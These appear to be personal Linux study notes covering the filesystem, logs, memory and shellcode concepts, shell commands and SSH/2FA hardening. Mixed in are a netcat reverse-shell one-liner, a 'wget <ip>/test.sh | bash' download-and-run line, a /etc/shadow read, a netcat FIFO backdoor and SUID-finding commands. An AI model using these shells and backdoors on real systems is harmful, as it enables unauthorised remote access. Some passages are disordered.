# Linux
#Linux 
Linux is a open source operation system.
## Philosophy 

|Principle|Description|
|---|---|
|Everything is a file| All configuration files for the various services running on the Linux operating system are stored in one or more text files.|
|Small, single-purpose programs|Linux offers many different tools that we will work with, which can be combined to work together.|
|Ability to chain programs together to perform complex tasks| The integration and combination of different tools enable us to carry out many large and complex tasks, such as processing or filtering specific data results. |
|Avoid captive user interfaces|Linux is designed to work mainly with the shell (or terminal), which gives the user greater control over the operating system.|
|Configuration data stored in a text file|An example of such a file is the /etc/passwd file, which stores all users registered on the system.|


|Component| Description|
|---|---|
|Bootloader| A piece of code that runs to guide the booting process to start the operating system. Parrot Linux uses the GRUB Bootloader.|
| OS kernel |The kernel is the main component of an operating system. It manages the resources for I/O devices the system at the hardware level.|
|Daemons | Background services are called "daemons" in Linux. Their purpose is to ensure that key functions such as scheduling, printing, and multimedia are working correctly. These small programs load after we booted or log into the computer.|
| OS Shell |The operating system shell or the command language interpreter (also known as the command line) is the interface between the OS and the user. This interface allows the user to tell the OS what to do. The most commonly used shells are Bash, Tcsh/Csh, Ksh, Zsh, and Fish.|
|Graphics Server| This provides a graphical sub-system (server) called "X" or "X-server" that allows graphical programs to run locally or remotely on the X-windowing system.|
|Window manger| Also known as a graphical user interface (GUI). There are many options, including GNOME, KDE, MATE, Unity, and Cinnamon. A desktop environment usually has several applications, including file and web browsers. These allow the user to access and manage the essential and frequently accessed features and services of an operating system.|
| Utilities |Applications or utilities are programs that perform particular functions for the user or another program.|

## Linux Architecture

|Layer|Description|
|---|---|
|Hardware|Peripheral devices such as the system's RAM, hard drive, CPU, and others.|
|Kernel|The core of the Linux operating system whose function is to virtualize and control common computer hardware resources like CPU, allocated memory, accessed data, and others. The kernel gives each process its own virtual resources and prevents/mitigates conflicts between different processes.|
|Shell|A command-line interface (**CLI**), also known as a shell that a user can enter commands into to execute the kernel's functions. |
|System Utility|Makes available to the user all of the operating system's functionality.|

## File
### File System Hierarchy

|Path|Description|
|---|---|
|/|The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.|
|/bin|Contains essential command binaries.|
|/boot|Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.|
|/dev|Contains device files to facilitate access to every hardware device attached to the system.|
|/etc|Local system configuration files. Configuration files for installed applications may be saved here as well.|
|/home|Each user on the system has a subdirectory here for storage.|
|/lib|Shared library files that are required for system boot.|
|/media|External removable media devices such as USB drives are mounted here.|
|/mnt|Temporary mount point for regular filesystems.|
|/opt|Optional files such as third-party tools can be saved here.|
|/root|The home directory for the root user.|
|/sbin|This directory contains executables used for system administration (binary system files).|
|/tmp|The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.|
|/usr|Contains executables, libraries, man files, etc.|
|/var|This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.|

### File descriptors 
File descriptors (FD) is Linux OS system kernel to perfrom Input/Oupout (I/O) operations. In [[Windows]] it called file handle. It the connection from OS to file when performing I/O operations. Linux have three file descriptors. 

|code| description|
|---|---|
|0|Input|
|1 | Output|
|2| Error|

It fequenctly used for error handling by passing the output to /dev/null which through out the data
e.g. find/ -name \*.conf 2>/dev/null 
The command will try and find all files thats ends with .conf  and all error *Permission denied* get thrown out. 
One can also redirect the different file descriptor to two seperate files. 
e.g. find/ -name \*.conf 2> error.txt 1> output.txt 


Unix system boot 
	-	First boot loader is executed in order to prepare the system to begin executing the Unix kernel code
	-	Kernel initialization and execution 
	-	Initial processes (init)
	-	Init run system start-up scripts
	
[[SSH]]
Is the most common way to interact with a linux with remote command tools 
[[SSH#^134d5d]]

The key elements of Unix
	-	Kernel : Memory resident part of the operating system, is the most important part of the Unix or any OS without kernel the OS does not function. It responsible for instructions to hardware and software. Kernel is loaded into memory at boot up. This allows faster interaction between all components. It must have a dedicated space in memory to reside without shifting. 
	-	Shell : The portion of the operating system with which users and process interact directly, Shell is the command line interpreter that uses to run programs on the computer, it provides user with interface to the system. 
	-	Hardware : Collection of components which house our data and provide means to communicate 
	
Services
	Services are started in one of four ways, at boot, by inetd/xinetd, Cron and command-line. 
	-	Init processes is started at boot, it tells the system what must be running until shutdown.
	-	Inted starts network services when there is a request for them. Xinetd is the extender of inted which allows the system to perform security checks, like limit hosts that can connect, prevent DOS attacks, etc. 
	-	Cron is similar to schedule task in windows [[Windows#^schedule]]
	
	
Security 
 The process to take to protect the OS. 
 -	Protect OS Binaries in /user, Typically the binaries that the attacker repaces are OS programs in the /user/bin and /usr/sbin directories, so protecting the /user file system is important. 
 -	Stop creating or bringing unauthorized set-UID and set-GID programs on the machine. 
 -	Raise alert if new or unexpected SUID/SGID programs appear. 
 -	Unix have two classes of users: normal who can only manipulate their own data, and superuser who can do anything to any object on the system. Unix comes with number of accounts that are associated with particular application on the system, it important to disable the accounts if the service or app is not used. 
 -	Passwd file contains the permissions and home directory. 
 -	Shadow is were the encrypted password is stored 
 -	Securing boot loader with password. (requires physical access to machine if rebooted)
 -	Tcpwrappers, all connection must pass thru a set of rules before being allowed to connect to a service. 
 -	Service should be deleted if not needed, even if they are disabled, they should still be kept up to date. 
	
Security enhancement 
	-	Bastille Linux will explain the issue and optionally fix them. The perl script inspects the system for common security mistakes. with each one, Bastille explains what the issue is, why it should be fixed and what side effects the fix might have. 
	-	[[snort]]
	-	SELinux enhance the default discretionary access control security of Unix system with the inclusion and management of a mandatory access control security effort. It allows administrators the ability to control all interactions of software on the system. 
	-	AppArmor is interchangeable with SELinux, it is seens as an easier alternative. 
	
## Log
-	UTMP log keeps tracks of users currently logged into the system.
-	WTMP log records user logon events.
-	Lastlog recoards users most recent login information.
-	SULOG is used to log the use of the switch user command (su).
-	SYSLOG record major events that take place on the system. including attempt to use su and failed login attempts.  Syslog.conf contains information on logs and location of the logs on the system. 
	
### Syslog
Accept messages over the network from any host that is able to reach the server. that means an attackers can continuously send a large volume of messages at the syslog until it either overwhelmed and cannot log any messages or filling up the disk. 
Syslog-NG is a replacemtn for the traditional syslog it allows the the ability to filter packages and the support for windows. 
	
[[Patch management]]
	-	Apt is DEbians patching tool, allows for automated patching on Debian based Unix system. 
	-	yum is the smart software installation too for centos and other Linux distributions. when asked to install or upgrade a package, yum knows how to identify and install any supporting packages. for example , if you install a new spell checking program, yum would know how to find and install the needed dictionary. Before yum, the administrator was often given an error message about missing dictionary that didn't event list what package contained the needed file. 
	
	
	
	

	

## Memory 
Physical memory; [[RAM]]
processor registers look as hard-coded variables. The fastest for the processor to access. 
	
Processor Cache is used by the CPU to quickly access instructions and data from memory  Consists of L caches. The closer you get to L1 the smaller the cache is, but also faster to fetch. 

Paging is performed when the system runs out of memory. The system will copy pages not recently accessed to the hard disk in a area set up as swap space. There by freeing up resources. 
Paging is the process of allowing indirect memory mapping. Linear addressing is mapped into fixed sized pages, most commonly 4KB, Pages mapped into page tables with up to 1024 entries. 
Object files.

When high-level programming language such as C or C++ is compiled into object code. This is the representation of the program in binary machine code format. Object file can consists of multiple components. During runtime multiple segments are mapped in memory the prim segments let us walk through each one of the segments so we may further lay a foundation. 

Stack segment short finite operations with predefined buffer sizes rightfully belong on the stack. 

LIFO (Last in, First out)

cdecl caller paces parameters, the called function from right to left and the caller tears down the stack

stdall, Parameters placed by caller from right to left and the called function is responsible for tearing down the stack

GNU Debugger 
	that run on UNIX OS, will attach to a process
	Similar tool for windows is called MinGW 
		
Syntax
	AT%T syntax
		Source, then destination, eg. mov $4,%eax would copy value 4 into eax. 
		last character in operands tell the size b = byte, w = word, l = long
	Intel syntax 
		Destination, then source
		
Linkers & Loader
	Linker link function name to actual location.
	Loader load a program from storage to memory.

objdump used to disassemble object files. 

readelf, display ELF object file information
		
### Dynamic memory 
Heap performing large memory allocation to hold user data or run rick content will utilize heap. Opening multiple Word documents would find the data on the heap. The heap is designed to border a large unused memory segment to allow it to grow without interfering with other memory segments . 
Once a program is loaded into memory, EIP holds the address for the first instruction in the code segment to start the program, also known as the program entry point. The code segment is often loaded at lower memory addresses than other segments. The data segment stores global and static variables used  by the program. With some implementations you will see other segments loaded that could potentially divide up the types of data in the data segment. The BSS segment stores uninitialized variables that may not be needed by the program, or that will remain uninitialized until they are referenced. 
Following the BSS segment is where the heap segment begins for example a web browser need to load an image on a page. memory must be allocated on the heap at this point in order to store the image in memory. The heap grows from lower memory addressing towards the stack segment. starting at a much higher memory address.  ^Memory

Linux Address space layout randomization (ASLR) 
The primary objective of ASLR and other compile-time controls is to protect programs from being exploited by attackers. one method is to make eligible pages of memory non-writable or non-executable. 
tool: Idd List dynamic dependencies 
Ret to ESP 
	jmp/call esp
ret to exa
	jmp/call exa
ret to ret
	return repeatedly down the stack
ret to ptr
	registers hold addresses on the stack we can control 

## Package management
Linux package managers can be used to install, update and remove package  from linux. 

|tool|description|
|---|---|
|dpkg|the dpkg is a tool to install, build, remove and manage Debian pacakage, more user friendly front-end for dpkg is aptitude|
|apt| High-level command interface for package management.|
|aptitude| alternative to apt and is a high-level interface|
|snap| snamps enable secure distributions of the latest apps and utilities for cloud, servers, etc.|
|gem| front-end to RybyGems, pacakage manager for ruby.|
|pip| python package manager, recommended way for installing python pacakges.
|git| package manager for git responsitories.|

## Services
There are two types of service the internal once which is responsible to the communication with the hardware. and then there service that is installed by the user, these services run in the background without any user interactions. 

list all service:
```bash
systemctl list-units --type=service
```

Use journalctl to view service logs for troubleshooting
```bash
journalctl -u 
```



## Shellcode 
#shell
It primarily used to spawn a shell. Shellcode is usually written in assembly and then assembled into machine code by tools such as netwide assembler. Nowadays it used to thing under the right of the program being compromised. A common usage of shellcode is to bind a shell listening port on the system, add user, dll injection. 
null bytes must not be part of the shell code, because if function hit a null byte it will be translated to a string terminator, causing the shell code to fail. ^Shellcode


Smashing the stack 
4 byte value before the return pointer. UNIX = canary, win Security cookie. 

Terminator canary
Random Canary
Null Canary 

	
Upgrade shell : 
python3 -c "import pty; pty.spawn('/bin/bash')" (check what version of python is installed or install python)
python -c "import pty; pty.spawn('/bin/bash')"
python -c |import pty;pty.spawn("/bin/sh")'
nc @IP @Port -e /bin/bash

[[Privilege escalation#^ebeddb]]

## Logs 
Linux uses Syslog itself is the protocol used to transport messages from network devices to a server that logs them. The log files on a syslog server are the main source of information about the operation and performance of network devices and other resources and are frequently used to identify and debug issues.

## File
In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session. It then takes the output of the bash session and puts it back into the netcat listener.

## Terminal 

### basic commands

|Command|Description|
|---|---|
|whoami|Displays current username.|
|id|Returns users identity.|
|hostname|Sets or prints the name of current host system.|
|uname|Prints operating system name.|
|pwd|Returns working directory name.|
|ifconfig|The ifconfig utility is used to assign or to view an address to a network interface and/or configure network interface parameters.|
|ip|Ip is a utility to show or manipulate routing, network devices, interfaces and tunnels.|
|netstat|Shows network status.|
|ss|Another utility to investigate sockets.|
|ps|Shows process status.|
|who|Displays who is logged in.|
|env|Prints environment or sets and executes command.|
|lsblk|Lists block devices.|
|lsusb|Lists USB devices|
|lsof|Lists opened files.|
|lspci|Lists PCI devices.|
|head|the first line of text.|
|tail|the end of the file.|
|sort|sort the result in the desired alphabetic 
|grep|Search for specific result.|
|cut|seperate the text based on delimiter|
|tr|replace words.|
|column|display result in tabular format|
|awk|filter was part of the result get displayed| 
|sed|replace text using regex format| 
|wc| count result| 
|chmod| change folder or file permission|
|chown|allows you to change the group and user of the file|


The most commonly used shell in Linux is the Bourne-Again Shell (|BASH|) and is part of the GNU project. Everything we do through the GUI we can do with the shell. The shell gives us many more possibilities to interact with programs and processes to get information faster. Besides, many processes can be easily automated with smaller or larger scripts that make manual work much.

The dollar sign, in this case, stands for a user. As soon as we log in as |root|, the character changes to a |hash| <|#|\> and looks like this:


### tip and tricks 

#### shortcuts
|key|description|
|---|---|
|TAB|Auto-complete-b|
|CTRL+A|move to the beginning.|
|CTRL+E|move to the end.|
|CTRL+arrow|jump word-|
|CTRL+u|delete everything from the cursor to the beginning.|
|CTRL+K|Delete everything from the cursor to the end.|
|CTRL+L|Clear terminal|
|CTRL+R|Search previous command|


| 
Direct the stdout to the next command. allows you append command to another one cat /etc/shadow | grep root
you can also it too download and execute in one line. wget <ip>/test.sh | bash

<< EOF >
Usage of the end of file function of linux system file, which defines the input end. 
e.g. cat << EOF > Stream.txt
We use the cat command to read our steaming input through the stream and direct it to a file called stream.txt.	
	
& 
allow you to continue to  use terminal e.g python -m http.server &

< use file as input for command

> write text to file, if the file does not exists it will be created. 

>> append text to file

### Sudo
**sudo** can be used with additional options:

-   **-h** – help; displays syntax and command options
-   **-V** – version; displays the current version of the sudo application
-   **-v** – validate; refresh the time limit on sudo without running a command
-   **-l** – list; lists the user’s privileges, or checks a specific command
-   **-k** – kill; end the current sudo privileges

&&
Execute additional command  e.g. apt update && apt upgrade
	
;
Similar to && but the first does not have to execute successfully. 
	
ps -ef | grep <pid>
	pipe the first command into the second
	You can find the pid value next to the suspicious connection under the Process column. Use that pid to identify the process with ps -ef
#### wc
Can be used to count the total number of result e.g. 
find / -name \*.conf 2>/dev/null | wc -l 
	
#### tree
Display tree structure of the directory. 
	
#### man 
	Can be used to get documentation about command
	
### strings	
Want to see the text inside a binary or data file?  The Linux |strings| command pulls those bits of text—called “strings”—out for you.

### Fish
[doc](https://fishshell.com/)
	
### fifo backdoor
first in first out
We will next need to create a fifo backpipe:
|||Bash
mknod backpipe p
|||
Next, let's start the backdoor:
|||Bash
/bin/bash 0<backpipe | nc -l 2222 1>backpipe
|||

	
#### cheatsheet 
	https://wiki.sans.blue/Tools/pdfs/LinuxCLI101.pdf
	https://wiki.sans.blue/Tools/pdfs/LinuxCLI.pdf
	https://digital-forensics.sans.org/media/linux-shell-survival-guide.pdf?msc=Cheat+Sheet+Blog
	https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blta6a2ae64ec0ed535/5eb08aaeead3926127b4df44/SMB-Access-from-Linux.pdf
	https://digital-forensics.sans.org/media/remnux-malware-analysis-tips.pdf?msc=Cheat+Sheet+Blog
	
	
	## Hardening 
Hardening of Linux system starts by limiting access to the system. by implementing what user can be access through ssh, limit to only user account not root, implement strong password on user and [[Fail2ban]] which ban anyone attempting to #Brute-force attack the server. The next step would be to stop used from accessing root account, if user required to run something as root, configure that in sudoer to only allow specific commands. Keep the system up to date. And remember to do audit on the machine using the logs. 

However, since in this case, the VPS is only used as a source for our organization and tools and we can access these resources via SSH, we should secure and harden the SSH server accordingly so that no one else (or at least no one other than the team members) can access it. There are many ways to harden it, and this includes the following precautions, but not limited to:

-   Install Fail2ban
-   Working only with SSH keys
-   Reduce Idle timeout interval
-   Disable passwords
-   Disable x11 forwarding
-   Use a different port
-   Limit users' SSH access
-   Disable root logins
-   Use SSH proto 2
-   Enable 2FA Authentication for SSH

|It is highly recommended to try these settings and precautions first in a local VM we have created before making these settings on a VPS.|

One of the first steps in hardening our system is updating and bringing the system |up-to-date|. We can do this with the following commands:

#### Update the System

  Update the System

|||shell-session
[cry0l1t3@VPS ~]$ sudo apt update -y && sudo apt full-upgrade -y && sudo apt autoremove -y && sudo apt autoclean -y
|||

---

## SSH Hardening

SSH is always installed on the VPS, giving us guaranteed access to the server in advance. Now we can change some of the settings in the configuration file |/etc/ssh/sshd_config| to enforce these security measures for our SSH server. In this file, we will comment out, change or add some lines. The entire list of possible settings that can be made for the SSH daemon can be found on the [man page](https://man.openbsd.org/sshd_config).

#### Install Fail2Ban

  Install Fail2Ban

|||shell-session
[cry0l1t3@VPS ~]$ sudo apt install fail2ban -y
|||

Once we have installed it, we can find the configuration file at |/etc/fail2ban/jail.conf|. We should make a backup if we make a mistake somewhere and it does not work as it should.

#### Fail2Ban Config Backup

  Fail2Ban Config Backup

|||shell-session
[cry0l1t3@VPS ~]$ sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.conf.bak
|||

In this file, we will find the field commented out with |# [sshd]|. In most cases, we will find the first line commented out there. Otherwise, we add this and two more, as shown in the following example:

#### /etc/fail2ban/jail.conf

  /etc/fail2ban/jail.conf

|||shell-session
...SNIP...

# [sshd]
enabled = true
bantime = 4w
maxretry = 3
|||

With this, we enable monitoring for the SSH server, set the |ban time| to four weeks, and allow a maximum of 3 |attempts|. The advantage of this is that once we have configured our |2FA| feature for SSH, fail2ban will ban the IP address that has entered the |verification code| incorrectly three times too. We should make the following configurations in the |/etc/ssh/sshd_config| file:

#### Editing OpenSSH Config

  Editing OpenSSH Config

|||shell-session
[cry0l1t3@VPS ~]$ sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
[cry0l1t3@VPS ~]$ sudo vim /etc/ssh/sshd_config
|||

**Settings**

**Description**

LogLevel VERBOSE

Gives the verbosity level that is used when logging messages from SSH daemon.

PermitRootLogin no

Specifies whether root can log in using SSH.

MaxAuthTries 3

Specifies the maximum number of authentication attempts permitted per connection.

MaxSessions 5

Specifies the maximum number of open shell, login, or subsystem (e.g., SFTP) sessions allowed per network connection.

HostbasedAuthentication no

Specifies whether rhosts or /etc/hosts.equiv authentication together with successful public key client host authentication is allowed (host-based authentication).

PermitEmptyPasswords no

When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings.

ChallengeResponseAuthentication yes

Specifies whether challenge-response authentication is allowed.

UsePAM yes

Specifies if PAM modules should be used for authentification.

X11Forwarding no

Specifies whether X11 forwarding is permitted.

PrintMotd no

Specifies whether SSH daemon should print /etc/motd when a user logs in interactively.

ClientAliveInterval 600

Sets a timeout interval in seconds, after which if no data has been received from the client, the SSH daemon will send a message through the encrypted channel to request a response from the client.

ClientAliveCountMax 0

Sets the number of client alive messages which may be sent without SSH daemon receiving any messages back from the client.

AllowUsers <username>

This keyword can be followed by a list of user name patterns, separated by spaces. If specified, login is allowed only for user names that match one of the patterns.

Protocol 2

Specifies the usage of the newer protocol with is more secure.

AuthenticationMethods publickey,keyboard-interactive

Specifies the authentication methods that must be successfully completed for a user to be granted access.

PasswordAuthentication no

Specifies whether password authentication is allowed.

---

## 2FA Authentication

With the configuration shown above, we have already taken essential steps to harden our SSH. Therefore, we can now go one step further and configure |2-factor authentication| (|2FA|). With this, we use a third-party software called Google Authenticator, which generates a six-digit code every 30 seconds that is needed to authenticate our identity. These six-digit codes represent a so-called |One-Time-Password| (OTP). |2FA| has proven itself an authentication method, not least because of its relatively high-security standard compared to the time required for implementation. Two different and independent authentication factors verify the identity of a person requesting access. We can find more information about |2FA| [here](https://en.wikipedia.org/wiki/Multi-factor_authentication).

We will use Google Authenticator as our authentication application on our Android or iOS smartphone. For this, we need to download and install the application from the Google/Apple Store. A guide on setting up Google Authenticator on our smartphone can be found [here](https://support.google.com/accounts/answer/185839?co=GENIE.Platform%3DDesktop&hl=en). To configure 2FA with Google Authenticator on our VPS, we need the [Google-Authenticator PAM module](https://github.com/google/google-authenticator-libpam). We can then install it and execute it to start configuring it as follows:

#### Installing Google-Authenticator PAM Module

  Installing Google-Authenticator PAM Module

|||shell-session
[cry0l1t3@VPS ~]$ sudo apt install libpam-google-authenticator -y
[cry0l1t3@VPS ~]$ google-authenticator

Do you want authentication tokens to be time-based (y/n) y

Warning: pasting the following URL into your browser exposes the OTP secret to Google:
  https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://totp/cry0l1t3@parrot%3Fsecret%...SNIP...%26issuer%3Dparrot

   [ ---- QR Code ---- ]

Your new secret key is: ***************
Enter code from app (-1 to skip):
|||

If we follow these steps, then a |QR code| and a |secret key| will appear in our terminal, which we can then scan with the Google Authenticator app or enter the secret key there. Once we have scanned the QR code or entered the secret key, we will see the first |OTP| (six-digit number) on our smartphone. We enter this in our terminal to synchronize and authorize Google Authenticator on our smartphone and our VPS with Google.

The module will then generate several |emergency scratch codes| (|backup codes|), which we should save safely. These will be used in case we lose our smartphone. Should this happen, we can then log in with the |backup codes|.

#### Google-Authenticator Configuration

  Google-Authenticator Configuration

|||shell-session
Enter code from app (-1 to skip): <Google-Auth Code>

Code confirmed
Your emergency scratch codes are:
  21323478
  43822347
  60232018
  73234726
  45456791
  
Do you want me to update your "/home/cry0l1t3/.google_authenticator" file? (y/n) y

Do you want to disallow multiple uses of the same authentication
token? This restricts you to one login about every 30s, but it increases
your chances to notice or even prevent man-in-the-middle attacks (y/n) y

By default, a new token is generated every 30 seconds by the mobile app.
In order to compensate for possible time-skew between the client and the server,
we allow an extra token before and after the current time. This allows for a
time skew of up to 30 seconds between authentication server and client. If you
experience problems with poor time synchronization, you can increase the window
from its default size of 3 permitted codes (one previous code, the current
code, the next code) to 17 permitted codes (the 8 previous codes, the current
code, and the 8 next codes). This will permit for a time skew of up to 4 minutes
between client and server.
Do you want to do so? (y/n) n

If the computer that you are logging into isn't hardened against brute-force
login attempts, you can enable rate-limiting for the authentication module.
By default, this limits attackers to no more than 3 login attempts every 30s.
Do you want to enable rate-limiting? (y/n) y
|||

Next, we need to configure the [PAM](https://en.wikipedia.org/wiki/Linux_PAM) module for the SSH daemon. To do this, we first create a backup of the file and open the file with a text editor such as Vim.

#### 2FA PAM Configuration

  2FA PAM Configuration

|||shell-session
[cry0l1t3@VPS ~]$ sudo cp /etc/pam.d/sshd /etc/pam.d/sshd.bak
[cry0l1t3@VPS ~]$ sudo vim /etc/pam.d/sshd
|||

We comment out the "|@include common-auth|" line by putting a "|#|" in front of it. Besides, we add two new lines at the end of the file, as follows:

#### /etc/pam.d/sshd

  /etc/pam.d/sshd

|||shell-session
#@include common-auth

...SNIP...

auth required pam_google_authenticator.so
auth required pam_permit.so
|||

Next, we need to adjust our settings in our SSH daemon to allow this authentication method. In this configuration file (|/etc/ssh/sshd_config|), we need to add two new lines at the end of the file as follows:

#### /etc/ssh/sshd\_config

  /etc/ssh/sshd\_config

|||shell-session
...SNIP...

AuthenticationMethods publickey,keyboard-interactive
PasswordAuthentication no
|||

Finally, we have to restart the SSH server to apply the new configurations and settings.

#### Restart SSH Server

  Restart SSH Server

|||shell-session
[cry0l1t3@VPS ~]$ sudo service ssh restart
|||

Now we can test this and try to login to the SSH server with our SSH key and check if everything works as intended.

#### 2FA SSH Login

  2FA SSH Login

|||shell-session
Adam@htb[/htb]$ ssh cry0l1t3@VPS -i cry0l1t3

Enter passphrase for key 'cry0l1t3': *************
Verification code: **Google-Auth Code**


	
## Cheat sheet 

|command|description|
|---|---|
|find . -perm /4000 2>/dev/null|find files with execution perm|
|find / -perm -u=s -type f 2>/dev/null| find files with special perm|